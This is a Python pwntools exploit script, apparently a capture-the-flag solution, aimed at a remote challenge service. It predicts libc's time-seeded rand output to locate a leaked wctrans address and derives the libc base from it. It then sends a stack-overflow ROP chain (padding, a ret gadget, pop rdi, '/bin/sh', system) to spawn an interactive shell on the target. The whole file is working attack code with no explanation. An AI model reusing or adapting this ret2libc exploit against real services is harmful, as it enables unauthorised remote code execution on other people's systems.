from pwn import *
from ctypes import *

libc = CDLL("./libc-2.27.so")
#libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time(0))

p = remote("chall.ehax.tech", 4269)
#p = process("chall")
e = ELF("./libc-2.27.so")
#e = ELF("/lib/x86_64-linux-gnu/libc.so.6")

idx = 0
for i in range(0x44):
	idx += 4
	for j in range(libc.rand() % 0x2a + 2):
		idx += 2
	idx += 2

	if i == 0x2a:
		break

print("idx: %d" % idx)

p.recvline()

wctrans_address = p.recvline()[idx:]
wctrans_address = int(wctrans_address[:wctrans_address.find(b"0x44")], 16)

libc_base = wctrans_address - e.symbols["wctrans"]

print(wctrans_address)
print("[+] libc base: %016x" % libc_base)

pop_rdi_ret = 0x400973
binsh = libc_base + list(e.search(b"/bin/sh"))[0]
system_address = libc_base + e.symbols["system"]

print("[+] binsh: %016x" % binsh)
print("[+] system address: %016x" % system_address)


payload = b"p" * 0xa8
payload += p64(0x40090c) # https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system_address)

p.sendlineafter(b"Enter authcode: ", payload)

p.interactive()
